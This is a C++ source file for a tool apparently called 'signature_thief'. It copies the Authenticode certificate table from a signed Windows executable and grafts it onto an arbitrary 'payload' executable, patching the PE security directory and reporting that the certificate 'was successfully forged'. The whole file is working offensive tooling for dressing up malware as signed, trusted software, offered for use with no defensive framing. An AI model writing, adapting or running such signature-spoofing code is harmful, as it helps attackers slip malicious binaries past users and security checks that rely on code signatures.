#include "signature_thief.hpp"

MappedFile MapFileToMemory(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);

    if (!file.is_open()) {
        throw std::runtime_error("Error opening file: " + filename);
    }

    LONGLONG size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<BYTE> buffer(size);
    file.read(reinterpret_cast<char*>(buffer.data()), size);

    return { std::move(buffer), size };
}

MappedFile RippedCert(const std::string& fromWhere) {
    MappedFile signedPeData = MapFileToMemory(fromWhere);

    PIMAGE_NT_HEADERS ntHdr = reinterpret_cast<PIMAGE_NT_HEADERS>(signedPeData.data.data() + reinterpret_cast<PIMAGE_DOS_HEADER>(signedPeData.data.data())->e_lfanew);
    auto certInfo = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];

    return { std::vector<BYTE>(signedPeData.data.begin() + certInfo.VirtualAddress, signedPeData.data.begin() + certInfo.VirtualAddress + certInfo.Size), certInfo.Size };
}

void AppendSignatureToPayload(const std::string& signedPePath, const std::string& payloadPath, const std::string& outputPath) {
    MappedFile certData = RippedCert(signedPePath);
    MappedFile payloadPeData = MapFileToMemory(payloadPath);

    std::vector<BYTE> finalPeData(payloadPeData.size + certData.size);
    std::memcpy(finalPeData.data(), payloadPeData.data.data(), payloadPeData.size);

    PIMAGE_NT_HEADERS ntHdr = reinterpret_cast<PIMAGE_NT_HEADERS>(finalPeData.data() + reinterpret_cast<PIMAGE_DOS_HEADER>(finalPeData.data())->e_lfanew);
    ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = static_cast<DWORD>(payloadPeData.size);
    ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = static_cast<DWORD>(certData.size);
    std::memcpy(finalPeData.data() + payloadPeData.size, certData.data.data(), certData.size);

    std::ofstream outputFile(outputPath, std::ios::binary);
    if (!outputFile.is_open()) {
        throw std::runtime_error("Error opening output file: " + outputPath);
    }

    outputFile.write(reinterpret_cast<const char*>(finalPeData.data()), payloadPeData.size + certData.size);

    std::cout << "The certificate was successfully forged." << std::endl;
}

int main(int argc, char** argv) {
    try {
        std::string signedPePath, payloadPath, outputPath;

        if (argc >= 4) {
            signedPePath = argv[1];
            payloadPath = argv[2];
            outputPath = argv[3];
        }
        else {
            std::cout << "Enter the path to the signed file: ";
            std::cin >> signedPePath;

            std::cout << "Enter the path to the payload file: ";
            std::cin >> payloadPath;

            std::cout << "Enter the output path: ";
            std::cin >> outputPath;
        }

        AppendSignatureToPayload(signedPePath, payloadPath, outputPath);
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
